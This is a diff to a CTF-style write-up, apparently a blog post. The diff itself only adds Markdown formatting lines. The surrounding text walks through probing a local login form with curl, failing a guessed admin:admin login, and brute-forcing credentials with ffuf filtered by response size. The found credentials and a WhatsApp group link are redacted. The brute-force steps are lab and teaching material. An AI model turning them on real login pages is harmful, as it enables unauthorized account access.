@@ -27,6 +27,9 @@ root@konek.securityhub.id's password:
 Last login: xxx xxx  x xx:xx:xx xxxx from xxx.xxx.xxx.xxx
 root@6c483be0c2ec:~#
 ```
+{: .nolineno}
+
+
 Next, I used the curl command to send a GET request, adding the -sv options for verbose output to gain more insight into the response:
 
 ```bash
@@ -56,6 +59,8 @@ Next, I used the curl command to send a GET request, adding the -sv options for 
 </form>
 * Connection #0 to host 127.0.0.1 left intact
 ```
+{: .nolineno}
+
 The output revealed a simple login form with username and password fields. I tested it by sending a POST request with generic credentials (admin:admin) using curl and the -d option to include the request data, but the attempt failed:
 ```bash
 ➜ sentinel curl -sv -XPOST 127.0.0.1:8080 -d 'username=admin&password=admin'
@@ -86,6 +91,8 @@ The output revealed a simple login form with username and password fields. I tes
 </form>
 * Connection #0 to host 127.0.0.1 left intact
 ```
+{: .nolineno}
+
 Since manual testing didn’t work, I used ffuf to automate the brute force attack. I specified the content type with the -H option and filtered responses of size 222 (failed attempts) using -fs:
 
 ```bash
@@ -119,6 +126,8 @@ ________________________________________________
     * PASS: [REDACTED]
     * USER: [REDACTED]
 ```
+{: .nolineno}
+
 After obtaining valid credentials, I used curl again to send a POST request and extracted the WhatsApp group link—preferring the CLI over a browser:
 
 ```bash
@@ -127,6 +136,8 @@ After obtaining valid credentials, I used curl again to send a POST request and 
 <h3>Login sukses! - https://chat.whatsapp.com/[REDACTED]</h3>
 <SNIP>
 ```
+{: .nolineno}
+
 ## Automation
 To streamline the brute force process, a Python script using the requests library can automate credential testing, reducing manual effort and improving efficiency.
 ![evidence](../assets/sentinel/poc.gif "brute.py")
